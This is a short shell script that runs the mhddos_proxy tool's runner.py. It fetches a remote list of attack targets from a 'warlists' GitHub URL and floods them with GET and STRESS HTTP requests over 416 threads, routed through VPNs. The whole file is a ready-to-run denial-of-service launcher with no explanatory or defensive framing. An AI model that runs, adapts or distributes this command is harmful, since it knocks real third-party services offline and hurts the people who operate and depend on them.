#!/usr/bin/env sh

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

python3 runner.py \
  --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_get-stress.lst \
  --debug \
  --http-methods GET STRESS \
  --threads 416 \
  --vpn 50
